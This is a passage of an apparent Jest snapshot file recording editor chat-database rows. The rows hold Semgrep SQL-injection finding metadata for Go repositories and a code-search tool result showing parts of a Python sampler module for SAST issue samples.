\\\\\\"skip_issue\\\\\\": false\\\\n        },\\\\n        {\\\\n            \\\\\\"is_public\\\\\\": true,\\\\n            \\\\\\"report_index\\\\\\": 29,\\\\n            \\\\\\"issue_object_hash\\\\\\": \\\\\\"bdbe6ad4a26aef8ad97db6e66adad229\\\\\\",\\\\n            \\\\\\"path_to_issue_object\\\\\\": \\\\\\"bdbe6ad4a26aef8ad97db6e66adad229.pkl\\\\\\",\\\\n            \\\\\\"path_to_issue_highlight_nodes_html\\\\\\": \\\\\\"bdbe6ad4a26aef8ad97db6e66adad229.html\\\\\\",\\\\n            \\\\\\"sast_report_path\\\\\\": \\\\\\"../../../dataset/data/canonical/jimm/semgrep\\\\\\",\\\\n            \\\\\\"source_code_path\\\\\\": \\\\\\"../../../dataset/data/canonical/jimm/repo.zip\\\\\\",\\\\n            \\\\\\"sast_provider\\\\\\": \\\\\\"SEMGREP\\\\\\",\\\\n            \\\\\\"sast_provider_issue_name\\\\\\": \\\\\\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\\\\\",\\\\n            \\\\\\"sast_provider_severity\\\\\\": \\\\\\"error\\\\\\",\\\\n            \\\\\\"sast_provider_language\\\\\\": \\\\\\"go\\\\\\",\\\\n            \\\\\\"skip_issue\\\\\\": false\\\\n        },\\\\n        {\\\\n            \\\\\\"is_public\\\\\\": true,\\\\n            \\\\\\"report_index\\\\\\": 12,\\\\n            \\\\\\"issue_object_hash\\\\\\": \\\\\\"12e36579cafa09e786f12c4a257ca4e7\\\\\\",\\\\n            \\\\\\"path_to_issue_object\\\\\\": \\\\\\"12e36579cafa09e786f12c4a257ca4e7.pkl\\\\\\",\\\\n            \\\\\\"path_to_issue_highlight_nodes_html\\\\\\": \\\\\\"12e36579cafa09e786f12c4a257ca4e7.html\\\\\\",\\\\n            \\\\\\"sast_report_path\\\\\\": \\\\\\"../../../dataset/data/codiewio/codenire/semgrep\\\\\\",\\\\n            \\\\\\"source_code_path\\\\\\": \\\\\\"../../../dataset/data/codiewio/codenire/repo.zip\\\\\\",\\\\n            \\\\\\"sast_provider\\\\\\": \\\\\\"SEMGREP\\\\\\",\\\\n            \\\\\\"sast_provider_issue_name\\\\\\": \\\\\\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\\\\\",\\\\n            \\\\\\"sast_provider_severity\\\\\\": \\\\\\"error\\\\\\",\\\\n            \\\\\\"sast_provider_language\\\\\\": \\\\\\"go\\\\\\",\\\\n            \\\\\\"skip_issue\\\\\\": false\\\\n        },\\\\n        {\\\\n            \\\\\\"is_public\\\\\\": true,\\\\n            \\\\\\"report_index\\\\\\": 28,\\\\n            \\\\\\"issue_object_hash\\\\\\": \\\\\\"d71c64f91f3745e9e6f8151d2b1f1b70\\\\\\",\\\\n            \\\\\\"path_to_issue_object\\\\\\": \\\\\\"d71c64f91f3745e9e6f8151d2b1f1b70.pkl\\\\\\",\\\\n            \\\\\\"path_to_issue_highlight_nodes_html\\\\\\": \\\\\\"d71c64f91f3745e9e6f8151d2b1f1b70.html\\\\\\",\\\\n            \\\\\\"sast_report_path\\\\\\": \\\\\\"../../../dataset/data/canonical/jimm/semgrep\\\\\\",\\\\n            \\\\\\"source_code_path\\\\\\": \\\\\\"../../../dataset/data/canonical/jimm/repo.zip\\\\\\",\\\\n            \\\\\\"sast_provider\\\\\\": \\\\\\"SEMGREP\\\\\\",\\\\n            \\\\\\"sast_provider_issue_name\\\\\\": \\\\\\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\\\\\",\\\\n            \\\\\\"sast_provider_severity\\\\\\": \\\\\\"error\\\\\\",\\\\n            \\\\\\"sast_provider_language\\\\\\": \\\\\\"go\\\\\\",\\\\n            \\\\\\"skip_issue\\\\\\": false\\\\n        },\\\\n        {\\\\n            \\\\\\"is_public\\\\\\": true,\\\\n            \\\\\\"report_index\\\\\\": 5,\\\\n            \\\\\\"issue_object_hash\\\\\\": \\\\\\"bc90c5d567713c3a4b7f2aece525894e\\\\\\",\\\\n            \\\\\\"path_to_issue_object\\\\\\": \\\\\\"bc90c5d567713c3a4b7f2aece525894e.pkl\\\\\\",\\\\n            \\\\\\"path_to_issue_highlight_nodes_html\\\\\\": \\\\\\"bc90c5d567713c3a4b7f2aece525894e.html\\\\\\",\\\\n            \\\\\\"sast_report_path\\\\\\": \\\\\\"../../../dataset/data/ISDuBA/ISDuBA/semgrep\\\\\\",\\\\n            \\\\\\"source_code_path\\\\\\": \\\\\\"../../../dataset/data/ISDuBA/ISDuBA/repo.zip\\\\\\",\\\\n            \\\\\\"sast_provider\\\\\\": \\\\\\"SEMGREP\\\\\\",\\\\n            \\\\\\"sast_provider_issue_name\\\\\\": \\\\\\"lang.security.audit.sqli.pgx-sqli.pgx-sqli\\\\\\",\\\\n            \\\\\\"sast_provider_severity\\\\\\": \\\\\\"error\\\\\\",\\\\n            \\\\\\"sast_provider_language\\\\\\": \\\\\\"go\\\\\\",\\\\n            \\\\\\"skip_issue\\\\\\": false\\\\n        }\\\\n    ]\\\\n}\\",\\"numCharactersInRequestedRange\\":7367,\\"totalLinesInFile\\":145}"}}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-40 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:e0ed03a1-7513-431a-8363-49f6733c309b",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"e0ed03a1-7513-431a-8363-49f6733c309b","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T16:48:02.049Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","capabilityType":15,"toolFormerData":{"tool":9,"toolCallId":"tool_5fabf87d-4877-4cfa-b230-cc9f586bd95","toolIndex":3,"modelCallId":"7f547ef9-6c9d-4e78-be83-f640161f57f7","status":"completed","rawArgs":"{\\"query\\": \\"samples directory patchino _samples\\", \\"target_directories\\": []}","name":"codebase_search","params":"{\\"repositoryInfo\\":{\\"relativeWorkspacePath\\":\\".\\",\\"repoName\\":\\"7297bde4-6c3c-4b5f-9f31-a615fa663f72\\",\\"repoOwner\\":\\"google-oauth2|user_01JMHPT9B3D4A66MBMWNRKH8QX\\",\\"orthogonalTransformSeed\\":3253139624173949,\\"preferredEmbeddingModel\\":\\"EMBEDDING_MODEL_UNSPECIFIED\\"},\\"query\\":\\"samples directory patchino _samples\\",\\"topK\\":15,\\"explanation\\":\\"\\",\\"codeResults\\":[{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/sampler.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":240,\\"column\\":20},\\"endPosition\\":{\\"line\\":268,\\"column\\":18}},\\"signatures\\":{}},\\"score\\":0.3773112893104553},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/sampler.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":170,\\"column\\":38},\\"endPosition\\":{\\"line\\":231,\\"column\\":40}},\\"signatures\\":{}},\\"score\\":0.35427165031433105},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/sampler.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":430,\\"column\\":82},\\"endPosition\\":{\\"line\\":466,\\"column\\":19}},\\"signatures\\":{\\"ranges\\":[{\\"startPosition\\":{\\"line\\":402,\\"column\\":1},\\"endPosition\\":{\\"line\\":403,\\"column\\":5}}]}},\\"score\\":0.34733879566192627},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/sampler.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":399,\\"column\\":19},\\"endPosition\\":{\\"line\\":430,\\"column\\":82}},\\"signatures\\":{}},\\"score\\":0.3328891098499298},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/issue_processor.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":227,\\"column\\":100},\\"endPosition\\":{\\"line\\":273,\\"column\\":52}},\\"signatures\\":{}},\\"score\\":0.3203110694885254},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/sampler.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":340,\\"column\\":10},\\"endPosition\\":{\\"line\\":374,\\"column\\":14}},\\"signatures\\":{}},\\"score\\":0.3197915554046631},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/sampler.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":1,\\"column\\":1},\\"endPosition\\":{\\"line\\":41,\\"column\\":2}},\\"signatures\\":{}},\\"score\\":0.31523633003234863},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/tests/conftest.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":1,\\"column\\":1},\\"endPosition\\":{\\"line\\":21,\\"column\\":56}},\\"signatures\\":{}},\\"score\\":0.3096945881843567},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/sampler.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":268,\\"column\\":18},\\"endPosition\\":{\\"line\\":316,\\"column\\":75}},\\"signatures\\":{}},\\"score\\":0.30686768889427185},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/sampler.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":316,\\"column\\":75},\\"endPosition\\":{\\"line\\":340,\\"column\\":10}},\\"signatures\\":{\\"ranges\\":[{\\"startPosition\\":{\\"line\\":271,\\"column\\":1},\\"endPosition\\":{\\"line\\":272,\\"column\\":5}}]}},\\"score\\":0.2911666929721832},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/backend/mutations/run_sampler.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":71,\\"column\\":86},\\"endPosition\\":{\\"line\\":103,\\"column\\":27}},\\"signatures\\":{\\"ranges\\":[{\\"startPosition\\":{\\"line\\":18,\\"column\\":1},\\"endPosition\\":{\\"line\\":19,\\"column\\":1}},{\\"startPosition\\":{\\"line\\":19,\\"column\\":1},\\"endPosition\\":{\\"line\\":24,\\"column\\":5}}]}},\\"score\\":0.2901548147201538},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"services/node_general_backend/src/maintenance/try_now.ts\\",\\"range\\":{\\"startPosition\\":{\\"line\\":1,\\"column\\":1},\\"endPosition\\":{\\"line\\":40,\\"column\\":5}},\\"signatures\\":{}},\\"score\\":0.2817254960536957},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/tests/conftest.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":186,\\"column\\":28},\\"endPosition\\":{\\"line\\":208,\\"column\\":27}},\\"signatures\\":{}},\\"score\\":0.2698521614074707},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"pycommon/tests/conftest.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":1,\\"column\\":1},\\"endPosition\\":{\\"line\\":42,\\"column\\":22}},\\"signatures\\":{}},\\"score\\":0.2692480683326721},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/sampler.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":374,\\"column\\":14},\\"endPosition\\":{\\"line\\":399,\\"column\\":19}},\\"signatures\\":{\\"ranges\\":[{\\"startPosition\\":{\\"line\\":343,\\"column\\":1},\\"endPosition\\":{\\"line\\":344,\\"column\\":5}}]}},\\"score\\":0.2687819004058838}]}","additionalData":{},"result":"{\\"codeResults\\":[{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/sampler.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":233},\\"endPosition\\":{\\"line\\":339}},\\"contents\\":\\"\\\\n\\\\n\\\\nasync def main(\\\\n    input_config_abs_path: str = str(SCRIPT_PATH / \\\\\\"../sampler_config.json\\\\\\"),\\\\n):\\\\n    with open(input_config_abs_path, \\\\\\"r\\\\\\") as f:\\\\n        input_config = SamplerConfig.from_json(f.read())\\\\n\\\\n    print(f\\\\\\"Sampler config: {input_config}\\\\\\")\\\\n    print(f\\\\\\"DATASET_DATA_FOLDER_PATH: {DATASET_DATA_FOLDER_PATH}\\\\\\")\\\\n\\\\n    samples = []\\\\n\\\\n    samples += await _get_customer_report_samples(input_config)\\\\n    samples += await _get_dataset_samples(input_config)\\\\n\\\\n    samples = samples[0 : input_config.max_sample_count]\\\\n\\\\n    sast_issue_type_used = set([s.issue.raw_issue_type for s in samples])\\\\n\\\\n    if sast_issue_type_used != set(input_config.sast_issue_types):\\\\n        unused_issue_types = set(input_config.sast_issue_types) - sast_issue_type_used\\\\n        print(\\\\n            f\\\\\\"Some of the issue types were not found or ignored due to samples count: {unused_issue_types}\\\\\\"\\\\n        )\\\\n\\\\n    await _save_output(input_config, samples)\\\\n    print(\\\\\\"Done\\\\\\")\\",\\"originalContents\\":\\"\\\\n\\\\n\\\\nasync def main(\\\\n    input_config_abs_path: str = str(SCRIPT_PATH / \\\\\\"../sampler_config.json\\\\\\"),\\\\n):\\\\n    with open(input_config_abs_path, \\\\\\"r\\\\\\") as f:\\\\n        input_config = SamplerConfig.from_json(f.read())\\\\n\\\\n    print(f\\\\\\"Sampler config: {input_config}\\\\\\")\\\\n    print(f\\\\\\"DATASET_DATA_FOLDER_PATH: {DATASET_DATA_FOLDER_PATH}\\\\\\")\\\\n\\\\n    samples = []\\\\n\\\\n    samples += await _get_customer_report_samples(input_config)\\\\n    samples += await _get_dataset_samples(input_config)\\\\n\\\\n    samples = samples[0 : input_config.max_sample_count]\\\\n\\\\n    sast_issue_type_used = set([s.issue.raw_issue_type for s in samples])\\\\n\\\\n    if sast_issue_type_used != set(input_config.sast_issue_types):\\\\n        unused_issue_types = set(input_config.sast_issue_types) - sast_issue_type_used\\\\n        print(\\\\n            f\\\\\\"Some of the issue types were not found or ignored due to samples count: {unused_issue_types}\\\\\\"\\\\n        )\\\\n\\\\n    await _save_output(input_config, samples)\\\\n    print(\\\\\\"Done\\\\\\")\\",\\"detailedLines\\":[{\\"text\\":\\"@dataclass\\",\\"lineNumber\\":234},{\\"text\\":\\"class Sample:\\",\\"lineNumber\\":235,\\"isSignature\\":true},{\\"lineNumber\\":237},{\\"text\\":\\"    report_path: str\\",\\"lineNumber\\":238},{\\"text\\":\\"    source_archive_path: str\\",\\"lineNumber\\":239},{\\"text\\":\\"    is_public: bool\\",\\"lineNumber\\":240,\\"isSignature\\":true},{\\"lineNumber\\":241},{\\"lineNumber\\":242},{\\"text\\":\\"async def main(\\",\\"lineNumber\\":243,\\"isSignature\\":true},{\\"text\\":\\"    input_config_abs_path: str = str(SCRIPT_PATH / \\\\\\"../sampler_config.json\\\\\\"),\\",\\"lineNumber\\":244,\\"isSignature\\":true},{\\"text\\":\\"):\\",\\"lineNumber\\":245,\\"isSignature\\":true},{\\"text\\":\\"    with open(input_config_abs_path, \\\\\\"r\\\\\\") as f:\\",\\"lineNumber\\":246},{\\"text\\":\\"        input_config = SamplerConfig.from_json(f.read())\\",\\"lineNumber\\":247},{\\"lineNumber\\":248},{\\"text\\":\\"    print(f\\\\\\"Sampler config: {input_config}\\\\\\")\\",\\"lineNumber\\":249},{\\"text\\":\\"    print(f\\\\\\"DATASET_DATA_FOLDER_PATH: {DATASET_DATA_FOLDER_PATH}\\\\\\")\\",\\"lineNumber\\":250},{\\"lineNumber\\":251},{\\"text\\":\\"    samples = []\\",\\"lineNumber\\":252},{\\"lineNumber\\":253},{\\"text\\":\\"    samples += await _get_customer_report_samples(input_config)\\",\\"lineNumber\\":254},{\\"text\\":\\"    samples += await _get_dataset_samples(input_config)\\",\\"lineNumber\\":255},{\\"lineNumber\\":256},{\\"text\\":\\"    samples = samples[0 : input_config.max_sample_count]\\",\\"lineNumber\\":257},{\\"lineNumber\\":258},{\\"text\\":\\"    sast_issue_type_used = set([s.issue.raw_issue_type for s in samples])\\",\\"lineNumber\\":259},{\\"lineNumber\\":260},{\\"text\\":\\"    if sast_issue_type_used != set(input_config.sast_issue_types):\\",\\"lineNumber\\":261},{\\"text\\":\\"        unused_issue_types = set(input_config.sast_issue_types) - sast_issue_type_used\\",\\"lineNumber\\":262},{\\"text\\":\\"        print(\\",\\"lineNumber\\":263},{\\"text\\":\\"            f\\\\\\"Some of the issue types were not found or ignored due to samples count: {unused_issue_types}\\\\\\"\\",\\"lineNumber\\":264},{\\"text\\":\\"        )\\",\\"lineNumber\\":265},{\\"lineNumber\\":266},{\\"text\\":\\"    await _save_output(input_config, samples)\\",\\"lineNumber\\":267},{\\"text\\":\\"    print(\\\\\\"Done\\\\\\")\\",\\"lineNumber\\":268,\\"isSignature\\":true},{\\"lineNumber\\":269},{\\"lineNumber\\":270},{\\"text\\":\\"async def _save_output(config: SamplerConfig, samples: list[Sample]) -> None:\\",\\"lineNumber\\":271,\\"isSignature\\":true},{\\"text\\":\\"    \\",\\"lineNumber\\":272}]},\\"score\\":0.3773112893104553},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/sampler.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":168,\\"column\\":33},\\"endPosition\\":{\\"line\\":239}},\\"contents\\":\\"\\\\n    \\\\\\"microsoft entity framework core\\\\\\": None,\\\\n    \\\\\\"microsoft extensions logger\\\\\\": None,\\\\n    \\\\\\"mybatis configuration\\\\\\": None,\\\\n    \\\\\\"objc\\\\\\": None,\\\\n    \\\\\\"objective-c core\\\\\\": None,\\\\n    \\\\\\"openapi configuration\\\\\\": None,\\\\n    \\\\\\"password secrets\\\\\\": None,\\\\n    \\\\\\"perl\\\\\\": None,\\\\n    \\\\\\"php\\\\\\": \\\\\\"php\\\\\\",\\\\n    \\\\\\"php configuration\\\\\\": \\\\\\"php\\\\\\",\\\\n    \\\\\\"php debug\\\\\\": \\\\\\"php\\\\\\",\\\\n    \\\\\\"plsql\\\\\\": None,\\\\n    \\\\\\"problem-based-packs\\\\\\": None,\\\\n    \\\\\\"py\\\\\\": \\\\\\"python\\\\\\",\\\\n    \\\\\\"python\\\\\\": \\\\\\"python\\\\\\",\\\\n    \\\\\\"python core\\\\\\": \\\\\\"python\\\\\\",\\\\n    \\\\\\"python core hashlib\\\\\\": \\\\\\"python\\\\\\",\\\\n    \\\\\\"python core os\\\\\\": \\\\\\"python\\\\\\",\\\\n    \\\\\\"python core random\\\\\\": \\\\\\"python\\\\\\",\\\\n    \\\\\\"python core shutil\\\\\\": \\\\\\"python\\\\\\",\\\\n    \\\\\\"python core sqlite3\\\\\\": \\\\\\"python\\\\\\",\\\\n    \\\\\\"python core subprocess\\\\\\": \\\\\\"python\\\\\\",\\\\n    \\\\\\"python lxml\\\\\\": \\\\\\"python\\\\\\",\\\\n    \\\\\\"python mysql\\\\\\": \\\\\\"python\\\\\\",\\\\n    \\\\\\"python mysqldb\\\\\\": \\\\\\"python\\\\\\",\\\\n    \\\\\\"ruby\\\\\\": None,\\\\n    \\\\\\"scala\\\\\\": None,\\\\n    \\\\\\"secrets\\\\\\": None,\\\\n    \\\\\\"sql core\\\\\\": None,\\\\n    \\\\\\"swift\\\\\\": None,\\\\n    \\\\\\"terraform\\\\\\": None,\\\\n    \\\\\\"text\\\\\\": None,\\\\n    \\\\\\"trailofbits\\\\\\": None,\\\\n    \\\\\\"trojan source\\\\\\": None,\\\\n    \\\\\\"ts\\\\\\": None,\\\\n    \\\\\\"typescript\\\\\\": None,\\\\n    \\\\\\"typescript angular\\\\\\": None,\\\\n    \\\\\\"vbnet\\\\\\": None,\\\\n    \\\\\\"web\\\\\\": None,\\\\n    \\\\\\"xml\\\\\\": \\\\\\"xml\\\\\\",\\\\n    \\\\\\"xml schema\\\\\\": \\\\\\"xml\\\\\\",\\\\n    \\\\\\"yaml\\\\\\": None,\\\\n    \\\\\\"yaml core\\\\\\": None,\\\\n    \\\\\\"\\\\\\": None,\\\\n}\\\\n\\\\n\\\\nclass SamplerConfig(BaseModel):\\\\n    sast_issue_types: Annotated[list[str], Len(min_length=1)]\\\\n    sast_issue_languages: Annotated[list[str], Len(min_length=1)]\\\\n    output_dir_path: str = str(SCRIPT_PATH / \\\\\\"../_samples\\\\\\")\\\\n    customer_report_path: Optional[str] = None\\\\n    customer_source_archive_path: Optional[str] = None\\\\n    customer_report_issue_indexes: Optional[list[int]] = None\\\\n    max_sample_count: int = 10\\\\n    is_from_docker: bool = False\\\\n\\\\n    @classmethod\\\\n    def from_json(cls, json_str: str) -> SamplerConfig:\\\\n        data = json.loads(json_str)\\\\n        return cls.model_validate(data)\\",\\"originalContents\\":\\"\\\\n    \\\\\\"microsoft entity framework core\\\\\\": None,\\\\n    \\\\\\"microsoft extensions logger\\\\\\": None,\\\\n    \\\\\\"mybatis configuration\\\\\\": None,\\\\n    \\\\\\"objc\\\\\\": None,\\\\n    \\\\\\"objective-c core\\\\\\": None,\\\\n    \\\\\\"openapi configuration\\\\\\": None,\\\\n    \\\\\\"password secrets\\\\\\": None,\\\\n    \\\\\\"perl\\\\\\": None,\\\\n    \\\\\\"php\\\\\\": \\\\\\"php\\\\\\",\\\\n    \\\\\\"php configuration\\\\\\": \\\\\\"php\\\\\\",\\\\n    \\\\\\"php debug\\\\\\": \\\\\\"php\\\\\\",\\\\n    \\\\\\"plsql\\\\\\": None,\\\\n    \\\\\\"problem-based-packs\\\\\\": None,\\\\n    \\\\\\"py\\\\\\": \\\\\\"python\\\\\\",\\\\n    \\\\\\"python\\\\\\": \\\\\\"python\\\\\\",\\\\n    \\\\\\"python core\\\\\\": \\\\\\"python\\\\\\",\\\\n    \\\\\\"python core hashlib\\\\\\": \\\\\\"python\\\\\\",\\\\n    \\\\\\"python core os\\\\\\": \\\\\\"python\\\\\\",\\\\n    \\\\\\"python core random\\\\\\": \\\\\\"python\\\\\\",\\\\n    \\\\\\"python core shutil\\\\\\": \\\\\\"python\\\\\\",\\\\n    \\\\\\"python core sqlite3\\\\\\": \\\\\\"python\\\\\\",\\\\n    \\\\\\"python core subprocess\\\\\\": \\\\\\"python\\\\\\",\\\\n    \\\\\\"python lxml\\\\\\": \\\\\\"python\\\\\\",\\\\n    \\\\\\"python mysql\\\\\\": \\\\\\"python\\\\\\",\\\\n    \\\\\\"python mysqldb\\\\\\": \\\\\\"python\\\\\\",\\\\n    \\\\\\"ruby\\\\\\": None,\\\\n    \\\\\\"scala\\\\\\": None,\\\\n    \\\\\\"secrets\\\\\\": None,\\\\n    \\\\\\"sql core\\\\\\": None,\\\\n    \\\\\\"swift\\\\\\": None,\\\\n    \\\\\\"terraform\\\\\\": None,\\\\n    \\\\\\"text\\\\\\": None,\\\\n    \\\\\\"trailofbits\\\\\\": None,\\\\n    \\\\\\"trojan source\\\\\\": None,\\\\n    \\\\\\"ts\\\\\\": None,\\\\n    \\\\\\"typescript\\\\\\": None,\\\\n    \\\\\\"typescript angular\\\\\\": None,\\\\n    \\\\\\"vbnet\\\\\\": None,\\\\n    \\\\\\"web\\\\\\": None,\\\\n    \\\\\\"xml\\\\\\": \\\\\\"xml\\\\\\",\\\\n    \\\\\\"xml schema\\\\\\": \\\\\\"xml\\\\\\",\\\\n    \\\\\\"yaml\\\\\\": None,\\\\n    \\\\\\"yaml core\\\\\\": None,\\\\n    \\\\\\"\\\\\\": None,\\\\n}\\\\n\\\\n\\\\nclass SamplerConfig(BaseModel):\\\\n    sast_issue_types: Annotated[list[str], Len(min_length=1)]\\\\n    sast_issue_languages: Annotated[list[str], Len(min_length=1)]\\\\n    output_dir_path: str = str(SCRIPT_PATH / \\\\\\"../_samples\\\\\\")\\\\n    customer_report_path: Optional[str] = None\\\\n    customer_source_archive_path: Optional[str] = None\\\\n    customer_report_issue_indexes: Optional[list[int]] = None\\\\n    max_sample_count: int = 10\\\\n    is_from_docker: bool = False\\\\n\\\\n    @classmethod\\\\n    def from_json(cls, json_str: str) -> SamplerConfig:\\\\n        data = json.loads(json_str)\\\\n        return cls.model_validate(data)\\",\\"detailedLines\\":[{\\"text\\":\\"    \\\\\\"microsoft aspnetcore mvc\\\\\\": None,\\",\\"lineNumber\\":170},{\\"text\\":\\"    \\\\\\"microsoft entity framework core\\\\\\": None,\\",\\"lineNumber\\":171},{\\"text\\":\\"    \\\\\\"microsoft extensions logger\\\\\\": None,\\",\\"lineNumber\\":172},{\\"text\\":\\"    \\\\\\"mybatis configuration\\\\\\": None,\\",\\"lineNumber\\":173},{\\"text\\":\\"    \\\\\\"objc\\\\\\": None,\\",\\"lineNumber\\":174},{\\"text\\":\\"    \\\\\\"objective-c core\\\\\\": None,\\",\\"lineNumber\\":175},{\\"text\\":\\"    \\\\\\"openapi configuration\\\\\\": None,\\",\\"lineNumber\\":176},{\\"text\\":\\"    \\\\\\"password secrets\\\\\\": None,\\",\\"lineNumber\\":177},{\\"text\\":\\"    \\\\\\"perl\\\\\\": None,\\",\\"lineNumber\\":178},{\\"text\\":\\"    \\\\\\"php\\\\\\": \\\\\\"php\\\\\\",\\",\\"lineNumber\\":179},{\\"text\\":\\"    \\\\\\"php configuration\\\\\\": \\\\\\"php\\\\\\",\\",\\"lineNumber\\":180},{\\"text\\":\\"    \\\\\\"php debug\\\\\\": \\\\\\"php\\\\\\",\\",\\"lineNumber\\":181},{\\"text\\":\\"    \\\\\\"plsql\\\\\\": None,\\",\\"lineNumber\\":182},{\\"text\\":\\"    \\\\\\"problem-based-packs\\\\\\": None,\\",\\"lineNumber\\":183},{\\"text\\":\\"    \\\\\\"py\\\\\\": \\\\\\"python\\\\\\",\\",\\"lineNumber\\":184},{\\"text\\":\\"    \\\\\\"python\\\\\\": \\\\\\"python\\\\\\",\\",\\"lineNumber\\":185},{\\"text\\":\\"    \\\\\\"python core\\\\\\": \\\\\\"python\\\\\\",\\",\\"lineNumber\\":186},{\\"text\\":\\"    \\\\\\"python core hashlib\\\\\\": \\\\\\"python\\\\\\",\\",\\"lineNumber\\":187},{\\"text\\":\\"    \\\\\\"python core os\\\\\\": \\\\\\"python\\\\\\",\\",\\"lineNumber\\":188},{\\"text\\":\\"    \\\\\\"python core random\\\\\\": \\\\\\"python\\\\\\",\\",\\"lineNumber\\":189},{\\"text\\":\\"    \\\\\\"python core shutil\\\\\\": \\\\\\"python\\\\\\",\\",\\"lineNumber\\":190},{\\"text\\":\\"    \\\\\\"python core sqlite3\\\\\\": \\\\\\"python\\\\\\",\\",\\"lineNumber\\":191},{\\"text\\":\\"    \\\\\\"python core subprocess\\\\\\": \\\\\\"python\\\\\\",\\",\\"lineNumber\\":192},{\\"text\\":\\"    \\\\\\"python lxml\\\\\\": \\\\\\"python\\\\\\",\\",\\"lineNumber\\":193},{\\"text\\":\\"    \\\\\\"python mysql\\\\\\": \\\\\\"python\\\\\\",\\",\\"lineNumber\\":194},{\\"text\\":\\"    \\\\\\"python mysqldb\\\\\\": \\\\\\"python\\\\\\",\\",\\"lineNumber\\":195},{\\"text\\":\\"    \\\\\\"ruby\\\\\\": None,\\",\\"lineNumber\\":196},{\\"text\\":\\"    \\\\\\"scala\\\\\\": None,\\",\\"lineNumber\\":197},{\\"text\\":\\"    \\\\\\"secrets\\\\\\": None,\\",\\"lineNumber\\":198},{\\"text\\":\\"    \\\\\\"sql core\\\\\\": None,\\",\\"lineNumber\\":199},{\\"text\\":\\"    \\\\\\"swift\\\\\\": None,\\",\\"lineNumber\\":200},{\\"text\\":\\"    \\\\\\"terraform\\\\\\": None,\\",\\"lineNumber\\":201},{\\"text\\":\\"    \\\\\\"text\\\\\\": None,\\",\\"lineNumber\\":202},{\\"text\\":\\"    \\\\\\"trailofbits\\\\\\": None,\\",\\"lineNumber\\":203},{\\"text\\":\\"    \\\\\\"trojan source\\\\\\": None,\\",\\"lineNumber\\":204},{\\"text\\":\\"    \\\\\\"ts\\\\\\": None,\\",\\"lineNumber\\":205},{\\"text\\":\\"    \\\\\\"typescript\\\\\\": None,\\",\\"lineNumber\\":206},{\\"text\\":\\"    \\\\\\"typescript angular\\\\\\": None,\\",\\"lineNumber\\":207},{\\"text\\":\\"    \\\\\\"vbnet\\\\\\": None,\\",\\"lineNumber\\":208},{\\"text\\":\\"    \\\\\\"web\\\\\\": None,\\",\\"lineNumber\\":209},{\\"text\\":\\"    \\\\\\"xml\\\\\\": \\\\\\"xml\\\\\\",\\",\\"lineNumber\\":210},{\\"text\\":\\"    \\\\\\"xml schema\\\\\\": 